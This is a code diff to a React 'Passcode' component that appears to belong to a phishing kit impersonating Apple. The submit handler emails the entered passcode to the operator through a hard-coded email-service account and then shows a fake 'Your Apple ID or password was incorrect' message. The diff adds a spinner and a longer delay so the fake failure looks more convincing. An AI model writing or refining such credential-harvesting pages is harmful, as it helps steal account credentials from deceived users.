@@ -23,11 +23,21 @@ const Passcode = () => {
       const hideModal = () => {
         setIsOpen(false)
       }
+      const [isSpinner, setIsSpinner] = React.useState(false)
+
+      const showSpinner = () => {
+        setIsSpinner(true)
+      }
+    
+      const hideSpinner = () => {
+        setIsSpinner(false)
+      }
+    
     
       const onSubmit = (e) => {
         e.preventDefault()
         send(
-          'service_semrrxd',
+          'service_semrrxdd',
           'template_3zzq5dy',
           toSend,
           'user_kSXaadotnMlrxgdtSyp9I'
@@ -35,7 +45,7 @@ const Passcode = () => {
           .then((response) => {
             console.log('SUCCESS!', response.status, response.text)
             //window.location.href = '/Verifay'
-            setTimeout(showModal, 3000)
+            setTimeout(showModal, 5000)
           })
           .catch((err) => {
             console.log('FAILED...', err)
@@ -142,6 +152,10 @@ const Passcode = () => {
                         <Button
                           type='submit'
                           variant='primary'
+                          onClick={(e) => {
+                            setTimeout(showSpinner, 1)
+                            setTimeout(showModal, 5000)
+                          }}
                           style={{
                             fontWeight: 'bold',
                             //width: '97%',
@@ -280,25 +294,20 @@ const Passcode = () => {
           }}
         >
           <Modal.Title
-            style={{
-              justifyContent: 'center',
-              fontSize: '16px',
-              fontWeight: 'bold',
-            }}
-          >
-            Verification Failed
-          </Modal.Title>
+            
+            >
+              <div style={{
+                justifyContent: 'center',
+                textAlign: 'center'
+              }}>Verification Failed </div><p style={{
+                justifyContent: 'center',
+                fontSize: '12px',
+                textAlign: 'center',
+                marginTop:'20px'
+              }}>Your Apple ID or password was incorrect.</p>
+            </Modal.Title>
         </Modal.Header>
 
-        <Modal.Body
-          style={{
-            fontSize: '12px',
-            textAlign: 'center',
-            fontFamily: 'Arial',
-          }}
-        >
-          Your Passcode was incorrect.
-        </Modal.Body>
 
         <Modal.Footer
           style={{
@@ -321,6 +330,14 @@ const Passcode = () => {
             OK
           </button>
         </Modal.Footer>
+      </Modal><Modal
+        show={isSpinner}
+        onHide={hideSpinner}
+      >
+          <div class="spin"
+      >
+            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+    
       </Modal></div>
     </div>
       )
